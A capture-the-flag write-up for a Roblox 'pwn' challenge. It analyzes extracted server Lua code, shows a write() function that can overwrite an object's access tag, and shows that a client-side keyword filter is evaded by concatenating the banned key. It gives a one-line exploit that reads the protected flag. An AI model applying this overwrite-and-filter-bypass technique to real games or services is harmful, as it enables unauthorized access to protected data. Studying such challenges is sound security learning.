# World's Hardestest Flag

## Meta
- Category: Pwn
- Challenge ID: 23
- Attachment: `mrdeh-hardestest.rbxl`
- Live target: `https://www.roblox.com/games/105471062200103/Worlds-Hardestest-Flag`
- Status: exploit path derived from local place file; live flag must be read in Roblox Player.

## Summary
The attachment is a Roblox binary place file. After decompressing the place chunks and extracting script `Source` properties, the important code is in `SecureDeh9001Server`.

The server stores the flag in a private-looking object:

```lua
[0x6767] = { TypeTag = 0, Value = FLAG }
```

`read()` blocks access when `TypeTag == 0`, but the sandbox exposes `write(address, new_data)` and it allows arbitrary fields of that object to be overwritten. Changing `TypeTag` to a public value makes `read(0x6767)` return the flag.

## Vulnerability
Relevant server logic:

```lua
local function write(address, new_data)
    if Storage[address] then
        for key, val in pairs(new_data) do
            Storage[address][key] = val
        end
    end
end

local function read(address)
    local tvalue = Storage[address]
    if not tvalue then return "nil" end
    if tvalue.TypeTag == 0 then return "[ACCESS DENIED]" end
    return tvalue.Value
end
```

The client terminal filters these banned words:

```lua
{"position", "humanoid", "destroy", "name", "typetag", "flag"}
```

The filter is substring-based and only runs on the client-side terminal input. The exploit avoids the literal string `typetag` by constructing the key dynamically.

## Exploit
Enter this in the in-game `SecureDeh9001` terminal:

```lua
write(0x6767,{["Type".."Tag"]=4});print(read(0x6767))
```

Expected result: the terminal prints `SERVER: <flag>`.

## Notes
- Local fallback flag in Studio is `Bonco{FAKEFAKEFAKE}`.
- The real flag is loaded server-side from Roblox DataStore key `CTFCredentials/TrueFlag`.
- I did not submit a flag or recover the live flag in this environment because Roblox Player/account execution is required.
